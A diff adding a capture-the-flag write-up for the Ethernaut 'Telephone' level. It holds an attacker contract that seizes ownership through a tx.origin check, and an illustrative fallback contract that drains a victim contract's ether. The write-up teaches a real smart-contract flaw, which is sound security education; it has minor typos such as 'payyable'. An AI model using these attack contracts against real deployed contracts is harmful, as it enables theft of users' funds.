@@ -171,3 +171,79 @@ print(CoinFlip.consecutiveWins() == 10)
 ```
 We have successfully passed the level! Moral of the story: Do not use `blockhash`, `block.number`, or any hardcoded values for random number generation. Note that although we created a custom contract to mimic the use of `blockhash` and `block.number`, those values can also be manipulated by miners. You are better off using oracle services for random number generation, such as `Chainlink VRF`.
 
+## Level 4: Telephone
+To beat this level we need to claim ownership of the contract. The owner variable can only be modified in the `changeOwner` function.
+```solidity
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+```
+All we need to do is call this function and pass our address as an argument. The catch is the require statement. We will only be able to set the owner to our address if `tx.origin` is not equal to `msg.sender`. How could we make sure this condition is met? To figure this out we need to be aware of the differences between `tx.origin` and `msg.sender`. `msg.sender` refers to the immediate sender of the transaction. `tx.origin` refers to the EOA (externally owned address) that initiated the transaction. This means that `msg.sender` can be either a contract or an EOA. On the other hand, `tx.origin` can only be an EOA. To solve this level we will create a custom contract and use that contract to call the `changeOwner` function. The `msg.sender` of the transaction will be our custom contract and the `tx.origin` will be the account that created our custom contract (our account).
+Our contract is very simple:
+```solidity
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttacker {
+    ITelephone public instance;
+
+    constructor(address _instance) public {
+        instance = ITelephone(_instance);
+    }
+
+    function attack(address _owner) external {
+        instance.changeOwner(_owner);
+    }
+}
+```
+We have a function called `attack()` that will call `changeOwner`. It will satisfy the require statement for reasons mentioned above. Once we call `attack()` with our address as an argument, we will be the new owners of the Telephone contract.
+```python
+TelephoneAttacker.attack(account.address, {"from": account})
+```
+Now we can now check that we are the new owner of the contract:
+```python
+print(Telephone.owner() == account.address)
+```
+We have successfully passed the level! 
+Moral of the story: Understand the differences between `ms.sender` and `tx.origin`. If you use `tx.origin` as an authorization check instead of `msg.sender`, your contract may fall victim to a phising-style attack. Here is a simple example of how this type of attack can occur:
+Suppose there is a victim contract
+```solidity
+contract Victim {
+    address payyable public owner;
+
+    constructor() {
+        owner = payable(msg.sender);
+    }
+
+    function withdraw() public {
+        require(tx.origin == owner);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+This contract allows the owner to withdraw funds from the contract. However, since the require statement checks the value of owner against `tx.origin`, this function is susceptible to a phising attack. 
+Consider an attacker contract
+```solidity
+interface IVictim {
+    function withdraw() external;
+}
+contract attacker {
+    IVictim public victim;
+
+    constructor(address _victim) {
+        victim = IVictim(_victim);
+    }
+
+    fallback() external payable {
+        victim.withdraw();
+    }
+}
+```
+This contract has a fallback function that will call the withdraw function of the victim contract. Now suppose the attacker got the victim to send ether from their account to the attacker's contract. That transaction will trigger the fallback function in the attacker's contract and that in turn will call the withdraw function. 
+```
+victim's account - ether - > attacker's contract - withdraw - > victim's contract
+```
+The withdraw function will look at the `tx.origin` of the transaction, which is the victim's account (owner), and the require statement will pass. Then all the ether in the victim's contract will be sent to `msg.sender`, which in this case is the attacker's contract. 
